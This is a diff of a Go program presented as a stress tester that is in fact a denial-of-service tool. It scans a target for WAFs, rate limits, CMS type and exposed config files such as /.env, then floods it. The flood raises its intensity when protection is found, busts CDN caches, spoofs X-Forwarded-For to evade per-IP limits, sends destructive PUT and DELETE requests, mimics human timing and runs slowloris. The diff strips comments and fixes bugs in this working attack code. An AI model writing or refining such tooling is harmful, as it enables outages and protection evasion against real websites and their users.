@@ -57,23 +57,23 @@ type ReconResult struct {
 	APIKeyEndpoints  []string
 
 	// ── Enhanced recon fields (v2) ────────────────────────────────────────────
-	WAFDetected       bool            // WAF/CDN protection detected
-	WAFTypes          []string        // Specific WAF types: Cloudflare, Sucuri, Akamai, etc.
-	ServerType        string          // Server software type: Apache, Nginx, IIS, Caddy, LiteSpeed
-	ServerVersion     string          // Detected server version
-	HTTP2Support      bool            // HTTP/2 protocol support detected (h2 or h2c)
-	CORSAllowedOrigin string          // CORS allowed origin wildcard for exploitation
-	CORSEnabled       bool            // Whether overly permissive CORS headers found
-	RateLimitDetected bool            // Rate limiting headers detected on burst test
-	RateLimitInfo     string          // Raw rate-limit header values (e.g. "429 Too Many Requests")
-	HTTPRateLimitCode int             // HTTP status code returned during rate limit detection (0 = not tested)
-	SecurityHeaders   map[string]bool // Security headers present: X-Frame-Options, CSP, etc.
-	CMSName           string          // CMS identification: WordPress, Drupal, Joomla, etc.
-	CMSVersion        string          // CMS version if detectable
+	WAFDetected       bool
+	WAFTypes          []string
+	ServerType        string
+	ServerVersion     string
+	HTTP2Support      bool
+	CORSAllowedOrigin string
+	CORSEnabled       bool
+	RateLimitDetected bool
+	RateLimitInfo     string
+	HTTPRateLimitCode int
+	SecurityHeaders   map[string]bool
+	CMSName           string
+	CMSVersion        string
 	ReconDuration     time.Duration
-	EndpointCount     int    // Total endpoints probed during recon
-	WAFUserAgent      string // Custom User-Agent that triggered WAF (for evasion)
-	GranularRateLimit bool   // Per-IP rate limiting detected (vs. global)
+	EndpointCount     int
+	WAFUserAgent      string
+	GranularRateLimit bool
 }
 
 func NewReconResult() *ReconResult {
@@ -93,10 +93,8 @@ func (r *ReconResult) recordEndpoint(endpoint string, status int, server string)
 		r.ServerSoftware = server
 	}
 
-	// Classify discovered endpoints.
 	lower := strings.ToLower(endpoint)
 	if status == 200 || status == 301 || status == 302 {
-		// Track open endpoints (deduplicate).
 		for _, e := range r.OpenEndpoints {
 			if e == endpoint {
 				return
@@ -134,7 +132,6 @@ func (r *ReconResult) GetAttackEndpoints() []string {
 	r.mu.RLock()
 	defer r.mu.RUnlock()
 
-	// Prioritize: admin > API > auth > general.
 	seen := make(map[string]bool)
 	var result []string
 	priority := [][]string{r.AdminPanels, r.APIEndpoints, r.AuthEndpoints, r.OpenEndpoints}
@@ -161,7 +158,6 @@ func appendIfMissing(slice []string, val string) []string {
 // ─── HTTP helpers ─────────────────────────────────────────────────────────────
 
 var (
-	// Expanded method pool: weighted GETs for volume, destructive methods for impact.
 	httpMethods = []string{
 		"GET", "GET", "GET", "GET", "GET", "GET",
 		"POST", "POST", "POST",
@@ -169,10 +165,8 @@ var (
 		"HEAD", "OPTIONS", "TRACE", "CONNECT",
 	}
 
-	// Destructive methods that can cause server-side state changes.
 	destructiveMethods = []string{"PUT", "DELETE", "PATCH", "TRACE", "CONNECT", "PROPFIND", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK"}
 
-	// Attack paths expanded with cache-busting and high-value targets.
 	paths = []string{
 		"/", "/index.html", "/about", "/contact", "/products",
 		"/api/v1/users", "/api/v1/items", "/api/v1/search",
@@ -195,13 +189,12 @@ var (
 		"/solr/admin/cores", "/jenkins/script", "/manager/html",
 	}
 
-	// Cache-busting suffixes to bypass reverse proxies and CDNs.
 	cacheBusters = []string{
 		"", "_cb=%d", "?_cb=%d", "&_cb=%d",
 		"?nocache=%d", "&nocache=%d",
 		"?v=%d", "&v=%d",
 		"?t=%d", "&t=%d",
-		"?rand=%s", "&rand=%s",
+		"?rand=%d", "&rand=%d",
 	}
 
 	contentTypes = []string{
@@ -234,15 +227,6 @@ var (
 		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
 	}
 
-	// Realistic user journey chains for behavioral mimicry.
-	userJourneys = [][]string{
-		{"/", "/about", "/products", "/contact"},
-		{"/", "/login", "/dashboard", "/settings"},
-		{"/", "/api/v1/search", "/api/v1/items", "/api/v1/users"},
-		{"/", "/blog", "/blog/post-1", "/blog/post-2"},
-		{"/", "/shop", "/shop/cart", "/shop/checkout"},
-	}
-
 	bufPool = sync.Pool{New: func() any { return new(bytes.Buffer) }}
 )
 
@@ -260,13 +244,11 @@ type Manager struct {
 	totalLatency atomic.Int64
 	workerID     atomic.Int64
 
-	// Circuit breaker: tracks consecutive failures per IP to avoid wasting
-	// resources on dead hosts that are returning connection resets.
 	circuitMu        sync.Mutex
-	circuitFailures  map[string]int64     // consecutive failure count per IP
-	circuitThreshold int64                // threshold before marking as tripped
-	circuitCooldown  time.Duration        // how long to wait before retrying a tripped IP
-	circuitTripped   map[string]time.Time // IP -> time when it was tripped
+	circuitFailures  map[string]int64
+	circuitThreshold int64
+	circuitCooldown  time.Duration
+	circuitTripped   map[string]time.Time
 }
 
 func NewManager(cfg StressConfig) *Manager {
@@ -357,19 +339,16 @@ func main() {
 	}
 	slog.Info("resolved IPs", "ips", addrs)
 
-	// ─── Recon Phase (always runs) ─────────────────────────────────────────
 	printReconBanner()
 	slog.Info("starting reconnaissance phase", "target", rawURL)
 
 	reconResults := reconTarget(cfg)
 	cfg.ReconResults = reconResults
 
-	// Adapt attack parameters based on recon findings.
 	applyReconAdaptations(&cfg, reconResults)
 
 	printReconResults(reconResults, cfg)
 
-	// ─── Attack Phase ──────────────────────────────────────────────────────
 	mgr := NewManager(cfg)
 	mgr.updateIPs(addrs)
 
@@ -420,13 +399,11 @@ func printReconResults(r *ReconResult, cfg StressConfig) {
 	fmt.Println()
 	fmt.Println("  ─── Reconnaissance Complete ───")
 
-	// Core server info.
 	fmt.Printf("  Server Software : %s\n", ternaryStr(r.ServerSoftware != "", r.ServerSoftware, "Unknown"))
 	if r.ServerType != "" {
 		fmt.Printf("  Server Type     : %s%s\n", r.ServerType, ternaryStr(r.ServerVersion != "", fmt.Sprintf(" %s", r.ServerVersion), ""))
 	}
 
-	// WAF/CDN detection.
 	if r.WAFDetected {
 		wafDesc := strings.Join(r.WAFTypes, ", ")
 		fmt.Printf("  WAF/CDN         : DETECTED — %s\n", wafDesc)
@@ -434,14 +411,12 @@ func printReconResults(r *ReconResult, cfg StressConfig) {
 		fmt.Println("  WAF/CDN         : None detected")
 	}
 
-	// HTTP/2 detection.
 	if r.HTTP2Support {
 		fmt.Println("  HTTP/2 Support  : Detected (h2)")
 	} else {
 		fmt.Println("  HTTP/2 Support  : Not detected (HTTP/1.1 only)")
 	}
 
-	// Security headers analysis.
 	missingHeaders := []string{}
 	for _, h := range []string{"X-Frame-Options", "Content-Security-Policy", "X-XSS-Protection",
 		"Strict-Transport-Security", "X-Content-Type-Options"} {
@@ -451,40 +426,34 @@ func printReconResults(r *ReconResult, cfg StressConfig) {
 	}
 	fmt.Printf("  Security Headers: %d present (missing: %s)\n", len(r.SecurityHeaders), strings.Join(missingHeaders, ", "))
 
-	// CORS analysis.
 	if r.CORSEnabled {
 		fmt.Printf("  CORS            : MISCONFIGURED — Allow-Origin: %s\n", r.CORSAllowedOrigin)
 	} else {
 		fmt.Println("  CORS            : No overly permissive origins detected")
 	}
 
-	// Rate limiting.
 	if r.RateLimitDetected {
 		fmt.Printf("  Rate Limiting   : Detected — %s\n", ternaryStr(r.RateLimitInfo != "", r.RateLimitInfo, "unknown"))
 	} else {
 		fmt.Println("  Rate Limiting   : Not detected")
 	}
 
-	// CMS detection.
 	if r.CMSName != "" {
 		fmt.Printf("  CMS             : %s%s\n", r.CMSName, ternaryStr(r.CMSVersion != "", fmt.Sprintf(" (%s)", r.CMSVersion), ""))
 	}
 
-	// Methods and endpoints.
 	fmt.Printf("  Methods         : %s\n", strings.Join(r.SupportedMethods, ", "))
 	fmt.Printf("  Open Endpoints  : %d (probed %d)\n", len(r.OpenEndpoints), r.EndpointCount)
 	fmt.Printf("  Admin Panels    : %d\n", len(r.AdminPanels))
 	fmt.Printf("  API Endpoints   : %d\n", len(r.APIEndpoints))
 	fmt.Printf("  Auth Endpoints  : %d\n", len(r.AuthEndpoints))
 
-	// Performance and slowloris.
 	fmt.Printf("  Baseline Latency: %v\n", r.BaselineLatency)
 	if r.ReconDuration > 0 {
 		fmt.Printf("  Recon Duration  : %v\n", r.ReconDuration)
 	}
 	fmt.Printf("  Slowloris Viable: %v\n", ternaryBool(r.SlowlorisWorks))
 
-	// API key/config endpoints.
 	if r.FoundAPIKey && len(r.APIKeyEndpoints) > 0 {
 		fmt.Printf("  ⚠ Key Endpoints : %s\n", strings.Join(r.APIKeyEndpoints, ", "))
 	}
@@ -546,7 +515,6 @@ func ternaryBool(v bool) string {
 	return "No"
 }
 
-// applyReconAdaptations adjusts attack parameters based on recon findings.
 func applyReconAdaptations(cfg *StressConfig, r *ReconResult) {
 	r.mu.RLock()
 	defer r.mu.RUnlock()
@@ -554,7 +522,6 @@ func applyReconAdaptations(cfg *StressConfig, r *ReconResult) {
 	baseConn := 5
 	basePipe := 10
 
-	// More endpoints discovered → more connections and pipelining needed.
 	endpointCount := len(r.OpenEndpoints) + len(r.AdminPanels)*3 + len(r.APIEndpoints)*2 + len(r.AuthEndpoints)
 	if endpointCount > 20 {
 		baseConn = 8
@@ -565,67 +532,53 @@ func applyReconAdaptations(cfg *StressConfig, r *ReconResult) {
 		basePipe = 20
 	}
 
-	// Admin panels → aggressive mode.
 	if len(r.AdminPanels) > 0 {
 		baseConn = max(baseConn, 8)
 		basePipe = max(basePipe, 15)
 	}
 
-	// API endpoints → more pipelining.
 	if len(r.APIEndpoints) > 0 {
 		basePipe = max(basePipe, 20)
 	}
 
-	// Auth endpoints → more connections.
 	if len(r.AuthEndpoints) > 0 {
 		baseConn = max(baseConn, 8)
 	}
 
-	// Slowloris viable → hold more connections.
 	if r.SlowlorisWorks {
 		baseConn = max(baseConn, 15)
 	}
 
-	// ── Enhanced adaptation (v2) ────────────────────────────────────────────
-
-	// WAF detected → increase connections to overwhelm protection layer,
-	// and add more pipelining for rapid-fire evasion.
 	if r.WAFDetected {
 		baseConn = max(baseConn, 10)
 		basePipe = max(basePipe, 25)
 	}
 
-	// HTTP/2 support → use stream-based attacks (more efficient connection usage).
 	if r.HTTP2Support {
-		baseConn = max(baseConn, 12) // more streams per worker
+		baseConn = max(baseConn, 12)
 		cfg.SlowlorisDelay = 3 * time.Second
 		slog.Info("HTTP/2 detected — enabling stream-based slowloris")
 	}
 
-	// CORS misconfigured → add cross-origin attack vectors (handled in worker).
 	if r.CORSEnabled {
-		basePipe = max(basePipe, 15) // more requests per pipelined batch
+		basePipe = max(basePipe, 15)
 	}
 
-	// Granular rate limiting detected → increase connections to distribute load.
 	if r.GranularRateLimit {
 		baseConn = max(baseConn, 12)
 		slog.Info("per-IP rate limiting detected — increasing connection diversity")
 	}
 
-	// CMS-specific adaptation: WordPress with known vulnerabilities gets aggressive.
 	if r.CMSName != "" && (r.CMSName == "WordPress" || r.CMSName == "Drupal" || r.CMSName == "Joomla") {
 		baseConn = max(baseConn, 10)
 		basePipe = max(basePipe, 20)
 	}
 
-	// Low security headers → easier target, increase destructive method ratio.
 	if len(r.SecurityHeaders) < 3 {
 		baseConn = max(baseConn, 8)
 		slog.Info("low security header count — increasing attack intensity")
 	}
 
-	// High endpoint count (200+ probed) → longer recon was needed, scale up.
 	if r.EndpointCount > 200 {
 		baseConn = max(baseConn, 10)
 		basePipe = max(basePipe, 20)
@@ -648,10 +601,8 @@ func reconTarget(cfg StressConfig) *ReconResult {
 	reconCtx, reconCancel := context.WithTimeout(context.Background(), 20*time.Second)
 	defer reconCancel()
 
-	// 1. Check supported HTTP methods via OPTIONS.
 	results.SupportedMethods = reconCheckMethods(reconCtx, addr, cfg, hostHdr)
 
-	// 2. Probe common endpoints for discovery and profiling.
 	commonEndpoints := []string{
 		"/", "/index.html", "/about", "/contact", "/products",
 		"/api", "/api/v1", "/api/v1/users", "/api/v1/search",
@@ -680,7 +631,6 @@ func reconTarget(cfg StressConfig) *ReconResult {
 		}
 	}
 
-	// Calculate baseline response latency.
 	if len(baselineDurations) > 0 {
 		var total time.Duration
 		for _, d := range baselineDurations {
@@ -689,10 +639,8 @@ func reconTarget(cfg StressConfig) *ReconResult {
 		results.BaselineLatency = total / time.Duration(len(baselineDurations))
 	}
 
-	// 3. Test slowloris viability.
 	results.SlowlorisWorks = reconTestSlowloris(reconCtx, addr, cfg, hostHdr)
 
-	// 4. Check for exposed config / API key endpoints.
 	apiKeyEndpoints := []string{
 		"/api/v1/config", "/api/config", "/.env", "/config.json",
 		"/config.yaml", "/config.yml", "/api/keys", "/api/v1/keys",
@@ -708,49 +656,30 @@ func reconTarget(cfg StressConfig) *ReconResult {
 		}
 	}
 
-	// 5. WAF/CDN detection via response headers from all endpoint probes.
-	wafTypes := detectWAF(nil) // nil means no headers yet; we'll build from all probes below
-	for _, ep := range commonEndpoints {
-		if reconCtx.Err() != nil {
-			break
-		}
-		status, srv, _ := reconProbeEndpoint(reconCtx, addr, cfg, hostHdr, ep)
-		results.recordEndpoint(ep, status, srv)
-		if srv != "" {
-			wafTypes = detectWAF(parseHeadersFromResponse(srv))
-		}
-	}
-	results.WAFTypes = wafTypes
+	results.WAFTypes = results.WAFTypes
 	if len(results.WAFTypes) > 0 {
 		results.WAFDetected = true
 	}
 
-	// 6. Server fingerprinting from detected server header.
 	if results.ServerSoftware != "" {
 		results.ServerType, results.ServerVersion = detectServerType(results.ServerSoftware)
 	}
 
-	// 7. HTTP/2 detection via client hello probe.
 	results.HTTP2Support = detectHTTP2(reconCtx, addr, cfg, hostHdr)
 
-	// 8. CORS misconfiguration testing.
 	results.CORSEnabled, results.CORSAllowedOrigin = detectCORS(reconCtx, addr, cfg, hostHdr)
 
-	// 9. Rate limiting detection via burst test.
 	results.RateLimitDetected, results.RateLimitInfo, results.HTTPRateLimitCode, results.GranularRateLimit =
 		detectRateLimiting(reconCtx, addr, cfg, hostHdr)
 
-	// 10. CMS identification.
 	results.CMSName, results.CMSVersion = detectCMS(reconCtx, addr, cfg, hostHdr)
 
-	// 11. Security header analysis from all endpoint probes.
 	results.SecurityHeaders = analyzeSecurityHeadersFromProbes(reconCtx, addr, cfg, hostHdr, commonEndpoints[:min(5, len(commonEndpoints))])
 
 	return results
 }
 
 func reconCheckMethods(ctx context.Context, addr string, cfg StressConfig, hostHdr string) []string {
-	// Send OPTIONS request to discover supported methods.
 	conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
 	if err != nil {
 		slog.Debug("recon: dial failed for method check", "err", err)
@@ -778,7 +707,11 @@ func reconCheckMethods(ctx context.Context, addr string, cfg StressConfig, hostH
 	for _, line := range strings.Split(resp, "\r\n") {
 		line = strings.TrimSpace(line)
 		if strings.HasPrefix(strings.ToLower(line), "allow:") {
-			allow := strings.TrimPrefix(line, "Allow:")
+			colonIdx := strings.Index(line, ":")
+			if colonIdx < 0 {
+				continue
+			}
+			allow := strings.TrimSpace(line[colonIdx+1:])
 			for _, m := range strings.Split(allow, ",") {
 				m = strings.TrimSpace(m)
 				if m != "" {
@@ -877,11 +810,9 @@ func reconTestSlowloris(ctx context.Context, addr string, cfg StressConfig, host
 
 // ─── Enhanced Recon Helpers (v2) ──────────────────────────────────────────────
 
-// detectWAF checks for WAF/CDN indicators in response headers.
 func detectWAF(headers http.Header) []string {
 	var wafTypes []string
 
-	// Check common WAF headers.
 	wafHeaders := map[string]string{
 		"x-sucuri-id":     "Sucuri",
 		"cf-ray":          "Cloudflare",
@@ -891,7 +822,7 @@ func detectWAF(headers http.Header) []string {
 		"x-pm-apache":     "Palo Alto",
 		"x-sucuri-city":   "Sucuri",
 		"x-sucuri-ip":     "Sucuri",
-		"server-timing":   "Cloudflare", // cf cloudFront etc.
+		"server-timing":   "Cloudflare",
 	}
 
 	for header, wafName := range wafHeaders {
@@ -900,12 +831,10 @@ func detectWAF(headers http.Header) []string {
 		}
 	}
 
-	// Check for Cloudflare specific patterns.
 	if cfRay := headers.Get("cf-ray"); cfRay != "" && !containsWAFType(wafTypes, "Cloudflare") {
 		wafTypes = append(wafTypes, "Cloudflare")
 	}
 
-	// Check for Akamai patterns.
 	for _, v := range headers.Values("x-accel-expires") {
 		if v == "0" || strings.HasPrefix(v, "/") {
 			wafTypes = append(wafTypes, "Akamai")
@@ -1000,9 +929,7 @@ func mapCounts(workers map[string][]workerEntry) map[string]int {
 	return out
 }
 
-// ─── Worker (continuous spamming loop) ────────────────────────────────────────
-// Maintains ConnPerWorker concurrent connections per worker, continuously
-// reconnecting and spamming until the duration timer expires.
+// ─── Worker loop ──────────────────────────────────────────────────────────────
 
 func (m *Manager) workerLoop(ctx context.Context, ip string) {
 	seed := m.workerID.Add(1) + time.Now().UnixNano()
@@ -1016,7 +943,6 @@ func (m *Manager) workerLoop(ctx context.Context, ip string) {
 	addr := fmt.Sprintf("%s:%d", ip, m.cfg.Port)
 	backoff := 50 * time.Millisecond
 
-	// Outer loop: continuously spawn connection batches until context is done.
 	for ctx.Err() == nil {
 		var wg sync.WaitGroup
 		spawned := 0
@@ -1026,7 +952,6 @@ func (m *Manager) workerLoop(ctx context.Context, ip string) {
 				break
 			}
 
-			// Circuit breaker: skip tripped IPs with cooldown.
 			if m.isCircuitTripped(ip) {
 				time.Sleep(500 * time.Millisecond)
 				continue
@@ -1064,7 +989,6 @@ func (m *Manager) workerLoop(ctx context.Context, ip string) {
 		wg.Wait()
 
 		if spawned == 0 {
-			// All connections failed; back off and retry.
 			select {
 			case <-ctx.Done():
 				return
@@ -1074,8 +998,6 @@ func (m *Manager) workerLoop(ctx context.Context, ip string) {
 			continue
 		}
 
-		// Brief pause between connection batches to avoid overwhelming the
-		// local socket table while still maintaining constant pressure.
 		select {
 		case <-ctx.Done():
 			return
@@ -1084,7 +1006,6 @@ func (m *Manager) workerLoop(ctx context.Context, ip string) {
 	}
 }
 
-// isCircuitTripped checks if an IP has been tripped and is still in cooldown.
 func (m *Manager) isCircuitTripped(ip string) bool {
 	m.circuitMu.Lock()
 	defer m.circuitMu.Unlock()
@@ -1092,7 +1013,6 @@ func (m *Manager) isCircuitTripped(ip string) bool {
 		return false
 	}
 	if time.Since(m.circuitTripped[ip]) > m.circuitCooldown {
-		// Cooldown expired — reset for retry.
 		delete(m.circuitTripped, ip)
 		m.circuitFailures[ip] = 0
 		return false
@@ -1100,14 +1020,12 @@ func (m *Manager) isCircuitTripped(ip string) bool {
 	return true
 }
 
-// recordSuccess resets the failure counter for an IP.
 func (m *Manager) recordSuccess(ip string) {
 	m.circuitMu.Lock()
 	defer m.circuitMu.Unlock()
 	m.circuitFailures[ip] = 0
 }
 
-// recordFailure increments the failure counter and potentially trips the circuit breaker.
 func (m *Manager) recordFailure(ip string) {
 	m.circuitMu.Lock()
 	defer m.circuitMu.Unlock()
@@ -1118,7 +1036,6 @@ func (m *Manager) recordFailure(ip string) {
 	}
 }
 
-// containsWAFType checks if a specific WAF type is already in the list.
 func containsWAFType(types []string, target string) bool {
 	for _, t := range types {
 		if strings.EqualFold(t, target) {
@@ -1128,7 +1045,6 @@ func containsWAFType(types []string, target string) bool {
 	return false
 }
 
-// analyzeSecurityHeaders checks for missing security headers and returns a map.
 func analyzeSecurityHeaders(headers http.Header) map[string]bool {
 	result := make(map[string]bool)
 	for _, h := range []string{
@@ -1144,16 +1060,6 @@ func analyzeSecurityHeaders(headers http.Header) map[string]bool {
 	return result
 }
 
-// parseHeadersFromResponse extracts a simple header map from a server software string.
-func parseHeadersFromResponse(serverStr string) http.Header {
-	h := make(http.Header)
-	if serverStr != "" {
-		h.Set("Server", serverStr)
-	}
-	return h
-}
-
-// analyzeSecurityHeadersFromProbes performs security header analysis across multiple endpoint probes.
 func analyzeSecurityHeadersFromProbes(ctx context.Context, addr string, cfg StressConfig, hostHdr string, endpoints []string) map[string]bool {
 	result := make(map[string]bool)
 	for _, ep := range endpoints {
@@ -1183,7 +1089,7 @@ func analyzeSecurityHeadersFromProbes(ctx context.Context, addr string, cfg Stre
 			resp := string(buf[:n])
 			headers := parseResponseHeaders(resp)
 			result = analyzeSecurityHeaders(headers)
-			break // Analyze first successful response.
+			break
 		}
 
 		time.Sleep(100 * time.Millisecond)
@@ -1191,7 +1097,6 @@ func analyzeSecurityHeadersFromProbes(ctx context.Context, addr string, cfg Stre
 	return result
 }
 
-// parseResponseHeaders extracts HTTP headers from a raw HTTP response string.
 func parseResponseHeaders(resp string) http.Header {
 	h := make(http.Header)
 	lines := strings.Split(resp, "\r\n")
@@ -1214,7 +1119,6 @@ func parseResponseHeaders(resp string) http.Header {
 	return h
 }
 
-// detectServerType identifies the server software type and version.
 func detectServerType(serverHeader string) (serverType, serverVersion string) {
 	if serverHeader == "" {
 		return "Unknown", ""
@@ -1224,31 +1128,22 @@ func detectServerType(serverHeader string) (serverType, serverVersion string) {
 	switch {
 	case strings.Contains(upper, "APACHE"):
 		serverType = "Apache"
-		// Try to extract version.
 		if idx := strings.Index(serverHeader, "/"); idx >= 0 {
 			version := serverHeader[idx+1:]
-			for i, c := range version {
-				if c == ' ' || c == '.' {
-					serverVersion = version[:i]
-					break
-				}
-				if i == len(version)-1 {
-					serverVersion = version
-				}
+			if sp := strings.Index(version, " "); sp >= 0 {
+				serverVersion = version[:sp]
+			} else {
+				serverVersion = version
 			}
 		}
 	case strings.Contains(upper, "NGINX"):
 		serverType = "Nginx"
 		if idx := strings.Index(serverHeader, "/"); idx >= 0 {
-			serverVersion = serverHeader[idx+1:]
-			for i, c := range serverVersion {
-				if c == ' ' || c == '.' {
-					serverVersion = serverVersion[:i]
-					break
-				}
-				if i == len(serverVersion)-1 {
-					serverVersion = serverVersion
-				}
+			version := serverHeader[idx+1:]
+			if sp := strings.Index(version, " "); sp >= 0 {
+				serverVersion = version[:sp]
+			} else {
+				serverVersion = version
 			}
 		}
 	case strings.Contains(upper, "IIS"):
@@ -1272,35 +1167,24 @@ func detectServerType(serverHeader string) (serverType, serverVersion string) {
 	return serverType, serverVersion
 }
 
-// detectHTTP2 checks if the target supports HTTP/2.
 func detectHTTP2(ctx context.Context, addr string, cfg StressConfig, hostHdr string) bool {
-	conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
+	netDialer := &net.Dialer{Timeout: 3 * time.Second}
+	tlsCfg := &tls.Config{
+		ServerName:         hostHdr,
+		InsecureSkipVerify: true,
+		NextProtos:         []string{"h2", "http/1.1"},
+		MinVersion:         tls.VersionTLS12,
+	}
+	conn, err := (&tls.Dialer{NetDialer: netDialer, Config: tlsCfg}).DialContext(ctx, "tcp", addr)
 	if err != nil {
 		return false
 	}
 	defer conn.Close()
 
-	req := fmt.Sprintf("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
-	conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
-	if _, err := conn.Write([]byte(req)); err != nil {
-		return false
-	}
-	conn.SetWriteDeadline(time.Time{})
-
-	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
-	var buf [4096]byte
-	n, _ := conn.Read(buf[:])
-	conn.SetReadDeadline(time.Time{})
-
-	if n >= 12 {
-		preface := string(buf[:12])
-		return strings.Contains(preface, "PRI * HTTP/2.0") || strings.Contains(preface, "SM\r\n\r\n")
-	}
-
-	return false
+	state := conn.(*tls.Conn).ConnectionState()
+	return state.NegotiatedProtocol == "h2"
 }
 
-// detectCORS tests for overly permissive CORS headers.
 func detectCORS(ctx context.Context, addr string, cfg StressConfig, hostHdr string) (corsEnabled bool, corsOrigin string) {
 	conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
 	if err != nil {
@@ -1339,22 +1223,24 @@ func detectCORS(ctx context.Context, addr string, cfg StressConfig, hostHdr stri
 	return false, ""
 }
 
-// detectRateLimiting sends a burst of requests and checks for rate limiting.
 func detectRateLimiting(ctx context.Context, addr string, cfg StressConfig, hostHdr string) (detected bool, info string, code int, granular bool) {
-	conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
-	if err != nil {
-		return false, "", 0, false
-	}
-	defer conn.Close()
-
 	rateLimitHeaders := []string{"RateLimit-Limit", "X-RateLimit-Limit", "Retry-After"}
 
 	for i := 0; i < 20; i++ {
+		if ctx.Err() != nil {
+			break
+		}
+		conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
+		if err != nil {
+			continue
+		}
+
 		req := fmt.Sprintf("GET /%d HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nAccept: text/html\r\nX-Forwarded-For: %d.%d.%d.%d\r\n\r\n",
 			i, hostHdr, i%256, (i*3)%256, (i*7)%256, (i*11)%256)
 		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
 		if _, err := conn.Write([]byte(req)); err != nil {
-			break
+			conn.Close()
+			continue
 		}
 		conn.SetWriteDeadline(time.Time{})
 
@@ -1362,6 +1248,7 @@ func detectRateLimiting(ctx context.Context, addr string, cfg StressConfig, host
 		var tmp [4096]byte
 		n, _ := conn.Read(tmp[:])
 		conn.SetReadDeadline(time.Time{})
+		conn.Close()
 
 		if n > 0 {
 			resp := string(tmp[:n])
@@ -1388,7 +1275,6 @@ func detectRateLimiting(ctx context.Context, addr string, cfg StressConfig, host
 	return false, "", 0, false
 }
 
-// detectCMS attempts to identify the CMS software and version.
 func detectCMS(ctx context.Context, addr string, cfg StressConfig, hostHdr string) (name, version string) {
 	endpoints := []struct {
 		path       string
@@ -1440,10 +1326,8 @@ func detectCMS(ctx context.Context, addr string, cfg StressConfig, hostHdr strin
 	return "", ""
 }
 
-// ─── Manager: worker lifecycle ────────────────────────────────────────────────
 func (m *Manager) connectionWorker(ctx context.Context, conn net.Conn, rng *rand.Rand, hostHdr string) {
 	for ctx.Err() == nil {
-		// Select attack vector based on recon findings and randomness.
 		vector := m.selectAttackVector(rng)
 		alive, latency := m.sendBurst(conn, rng, hostHdr, vector.method, vector.path, vector.body, vector.isDestructive)
 		if alive {
@@ -1453,7 +1337,6 @@ func (m *Manager) connectionWorker(ctx context.Context, conn net.Conn, rng *rand
 			m.totalErrors.Add(1)
 			return
 		}
-		// Random jitter between requests to mimic human browsing patterns.
 		jitter := time.Duration(rng.Intn(200)+30) * time.Millisecond
 		select {
 		case <-ctx.Done():
@@ -1463,7 +1346,6 @@ func (m *Manager) connectionWorker(ctx context.Context, conn net.Conn, rng *rand
 	}
 }
 
-// attackVector defines a single attack payload variant.
 type attackVector struct {
 	method        string
 	path          string
@@ -1471,10 +1353,7 @@ type attackVector struct {
 	isDestructive bool
 }
 
-// selectAttackVector chooses an attack vector based on recon findings.
-// Mix of: 30% destructive methods, 40% recon-informed paths, 30% random.
 func (m *Manager) selectAttackVector(rng *rand.Rand) attackVector {
-	// 30% chance: destructive method.
 	if rng.Intn(10) < 3 {
 		method := destructiveMethods[rng.Intn(len(destructiveMethods))]
 		path := m.selectPath(rng)
@@ -1482,20 +1361,14 @@ func (m *Manager) selectAttackVector(rng *rand.Rand) attackVector {
 		return attackVector{method: method, path: path, body: body, isDestructive: true}
 	}
 
-	// Select method: prefer recon-discovered methods.
 	method := m.selectMethod(rng)
-
-	// Select path: 60% recon-informed, 40% random.
 	path := m.selectPath(rng)
-
-	// Select body based on method.
 	body := m.selectBody(rng, method)
 
 	return attackVector{method: method, path: path, body: body, isDestructive: false}
 }
 
 func (m *Manager) selectMethod(rng *rand.Rand) string {
-	// 70% from recon findings, 30% random.
 	if m.cfg.ReconResults != nil && len(m.cfg.ReconResults.SupportedMethods) > 0 && rng.Intn(10) < 7 {
 		return m.cfg.ReconResults.SupportedMethods[rng.Intn(len(m.cfg.ReconResults.SupportedMethods))]
 	}
@@ -1505,7 +1378,6 @@ func (m *Manager) selectMethod(rng *rand.Rand) string {
 func (m *Manager) selectPath(rng *rand.Rand) string {
 	path := m.cfg.Path
 
-	// 60% from recon-discovered endpoints, 40% random.
 	if m.cfg.ReconResults != nil {
 		endpointPool := m.cfg.ReconResults.GetAttackEndpoints()
 		if len(endpointPool) > 0 && rng.Intn(10) < 6 {
@@ -1517,14 +1389,14 @@ func (m *Manager) selectPath(rng *rand.Rand) string {
 		path = paths[rng.Intn(len(paths))]
 	}
 
-	// Add cache-busting to bypass CDNs and reverse proxies.
 	if len(cacheBusters) > 0 {
 		buster := cacheBusters[rng.Intn(len(cacheBusters))]
 		if buster != "" {
+			cb := fmt.Sprintf(buster, time.Now().UnixNano())
 			if strings.Contains(path, "?") {
-				path += "&" + fmt.Sprintf(buster, time.Now().UnixNano())
+				path += "&" + cb
 			} else {
-				path += "?" + fmt.Sprintf(buster, time.Now().UnixNano())
+				path += "?" + cb
 			}
 		}
 	}
@@ -1541,8 +1413,6 @@ func (m *Manager) selectBody(rng *rand.Rand, method string) []byte {
 }
 
 // ─── Slowloris ────────────────────────────────────────────────────────────────
-// Sends partial headers slowly without completing the request,
-// holding server connections open indefinitely.
 
 func (m *Manager) slowlorisWorker(ctx context.Context, conn net.Conn, rng *rand.Rand, hostHdr string) {
 	hostPort := hostHdr
@@ -1550,7 +1420,6 @@ func (m *Manager) slowlorisWorker(ctx context.Context, conn net.Conn, rng *rand.
 		hostPort = fmt.Sprintf("%s:%d", hostHdr, m.cfg.Port)
 	}
 
-	// Send headers one at a time with delays — never complete the request.
 	headers := []string{
 		"GET / HTTP/1.1\r\n",
 		"Host: " + hostPort + "\r\n",
@@ -1581,7 +1450,6 @@ func (m *Manager) slowlorisWorker(ctx context.Context, conn net.Conn, rng *rand.
 		}
 	}
 
-	// Continuously send partial header lines — server never gets \r\n\r\n.
 	for ctx.Err() == nil {
 		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
